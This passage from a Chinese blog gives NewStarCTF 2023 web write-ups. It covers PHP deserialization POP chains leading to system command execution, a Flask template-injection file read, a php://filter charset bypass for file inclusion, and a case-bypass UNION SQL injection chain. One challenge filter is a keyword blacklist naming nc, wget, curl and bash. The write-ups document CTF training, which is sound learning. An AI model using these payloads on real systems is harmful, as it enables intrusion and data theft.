class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;name)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> CTF;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>;<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><h2 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h2><p>打开容器后发现返回表头pop值为&#x2F;secr3tofpop</p><p>进入后发现是python flask的ssti</p><p>黑名单有<code>&#123;&#123;&#125;&#125;</code>，<code>os</code>，<code>=</code>等</p><p><code>name=&#123;%print(&#123;&#125;.__class__.__bases__[0].__subclasses__())%&#125;</code>查看所有方法</p><p>使用FileLoader</p><p><code>?name=&#123;%print(&#123;&#125;.__class__.__bases__[0].__subclasses__()[99][%22get_data%22](0,%22flag%22))%&#125;</code></p><p>得到flag</p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><p>打开容器，发现代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;code))&#123;<br>            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;alright&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//wanna try?</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤的字符有点多，不太容易RCE，最后用了个小技巧，把index.php中的<code>|</code>删去，然后再命令执行。</p><p>给出payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;code)) &#123;<br>            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;alright&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> minipop;<br><span class="hljs-variable">$a</span>-&gt;qwejaskdjnlka = <span class="hljs-keyword">new</span> minipop;<br><span class="hljs-variable">$a</span>-&gt;qwejaskdjnlka-&gt;code = <span class="hljs-string">&#x27;sed -i \&#x27;s/|//g\&#x27; index`echo -e &quot;\x2ep&quot;`hp&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;qwejaskdjnlka-&gt;code = <span class="hljs-string">&#x27;ls / &gt;1.php&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;qwejaskdjnlka-&gt;code = <span class="hljs-string">&#x27;cat /flag_is_h3eeere &gt;1.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><h2 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h2><p>不会，等个官方wp，但凭感觉是原型链污染</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第三周感觉难度上来了，做起来有点费劲了</p><p>贴个官方wp：<a href="https://shimo.im/docs/QPMRxzGktzsZnzhz">https://shimo.im/docs/QPMRxzGktzsZnzhz</a></p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023-WEEK2 Web WriteUp</title>
    <link href="/2023/10/10/2023newstarctfWeek2/"/>
    <url>/2023/10/10/2023newstarctfWeek2/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>解题 6&#x2F;6</p><h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p>打开容器，发现一个前端页面，F12进行javascript代码审计。</p><p>发现函数gameover()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">gameover</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">if</span>(gameScore &gt; <span class="hljs-number">100000</span>)&#123;<br>        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;/api.php&quot;</span>, <span class="hljs-literal">true</span>);<br>        xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);<br>        xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>            <span class="hljs-keyword">var</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>            <span class="hljs-title function_">alert</span>(response.<span class="hljs-property">message</span>);<br>        &#125;<br>        &#125;;<br>        <span class="hljs-keyword">var</span> data = &#123;<br>            <span class="hljs-attr">score</span>: gameScore,<br>        &#125;;<br>        xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));<br>    &#125;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;成绩：&quot;</span>+gameScore);<br>gameScore=<span class="hljs-number">0</span>;  <br>curPhase =<span class="hljs-variable constant_">PHASE_READY</span>;  <br>hero = <span class="hljs-literal">null</span>;<br>hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();      <br>&#125;<br></code></pre></td></tr></table></figure><p>分析逻辑，发现当<code>gameScore</code>大于100000时，会将<code>&#123;score: gameScore&#125;</code>转化为json发送到&#x2F;api.php，将返回结果<code>alert</code>，因此猜测flag由api.php给出。</p><p>在控制台重写gameover函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">gameover</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">if</span>(gameScore &lt; <span class="hljs-number">100000</span>)&#123;<br>        gameScore = <span class="hljs-number">1000000</span>;<br>        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;/api.php&quot;</span>, <span class="hljs-literal">true</span>);<br>        xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);<br>        xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>            <span class="hljs-keyword">var</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>            <span class="hljs-title function_">alert</span>(response.<span class="hljs-property">message</span>);<br>        &#125;<br>        &#125;;<br>        <span class="hljs-keyword">var</span> data = &#123;<br>            <span class="hljs-attr">score</span>: gameScore,<br>        &#125;;<br>        xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));<br>    &#125;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;成绩：&quot;</span>+gameScore);<br>gameScore=<span class="hljs-number">0</span>;  <br>curPhase =<span class="hljs-variable constant_">PHASE_READY</span>;  <br>hero = <span class="hljs-literal">null</span>;<br>hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();      <br>&#125;<br></code></pre></td></tr></table></figure><p>接着在控制台执行gameover()，得到flag：<code>flag&#123;5d66c0a8-cb52-4099-a3fb-f7d5cf4826d0&#125;</code></p><h2 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h2><p>打开容器，发现一段php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看到<code>include</code>，文件包含漏洞。</p><p>但是<code>!preg_match(&#39;/base|rot/i&#39;,$file)</code>如果file中含有base和rot就会die，所以用不了普通的<code>php://filter/read=convert.base64-encode/resource=flag.php</code>和<code>php://filter/read=string.rot13/resource=flag.php</code></p><p>使用其他字符集，<code>php://filter/read=convert.iconv.UTF8.UTF7/resource=flag.php</code>，得到<code>flag+AHs-59c6afe7-3cad-4eb3-abac-38b09521a184+AH0</code></p><p>稍加改动，得到flag：<code>flag&#123;59c6afe7-3cad-4eb3-abac-38b09521a184&#125;</code></p><p>这里贴一个字符集filter脚本，<a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">wupco&#x2F;PHP_INCLUDE_TO_SHELL_CHAR_DICT </a></p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>打开容器，发现好多a标签，随便点点，发现有id参数传入。</p><p><code>?id=TMP0919&#39;--+</code>发现依旧可以显示，猜测是sql注入。</p><p>但是<code>?id=TMP0919&#39;or 1=1--+</code>显示no，有黑名单，使用大小写绕过。</p><p><code>?id=TMP0919&#39;Or 1=1--+</code>绕过成功。</p><p><strong>查字段数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span>TMP0919<span class="hljs-string">&#x27; Order by 5--+</span><br></code></pre></td></tr></table></figure><p>成功</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span>TMP0919<span class="hljs-string">&#x27; Order by 6--+</span><br></code></pre></td></tr></table></figure><p>无法回显，得到字段数为5。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span>T<span class="hljs-string">&#x27; union seLect 1,2,3,4,5--+</span><br></code></pre></td></tr></table></figure><p>可以正常回显。</p><p><strong>查库名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span>T<span class="hljs-string">&#x27; union seLect database(),2,3,4,5--+</span><br></code></pre></td></tr></table></figure><p>回显<code>ctf</code>，注意select需要使用大小写绕过。</p><p><strong>查表名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span>T<span class="hljs-string">&#x27; union seLect database(),(seLect group_concat(table_name) from infOrmation_schema.tables wHere table_schema=database()),3,4,5--+</span><br></code></pre></td></tr></table></figure><p>返回<code>grades,here_is_flag</code>，发现here_is_flag表，注意information_schema和where需要使用大小写绕过。</p><p><strong>查列名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span>T<span class="hljs-string">&#x27; union seLect database(),(seLect group_concat(table_name) from infOrmation_schema.tables wHere table_schema=database()),(seLect group_concat(column_name) from infOrmation_schema.columns wHere table_name=&#x27;</span>here_is_flag<span class="hljs-string">&#x27; ),4,5--+</span><br></code></pre></td></tr></table></figure><p>返回<code>flag</code>，得到flag列</p><p><strong>查flag</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span>T<span class="hljs-string">&#x27; union seLect database(),(seLect group_concat(table_name) from infOrmation_schema.tables wHere table_schema=database()),(seLect group_concat(column_name) from infOrmation_schema.columns wHere table_name=&#x27;</span>here_is_flag<span class="hljs-string">&#x27; ),(seLect flag from ctf.here_is_flag),5--+</span><br></code></pre></td></tr></table></figure><p>得到flag：<code>flag&#123;fbbd976e-4244-4154-b2d1-a38dba8a9ef2&#125;</code></p><h2 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h2><p>打开容器，发现php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>        &#125;<br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;unser&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用php反序列化漏洞，本地搭建php环境</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ls /&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd)) &#123;<br>            @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> evil;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span 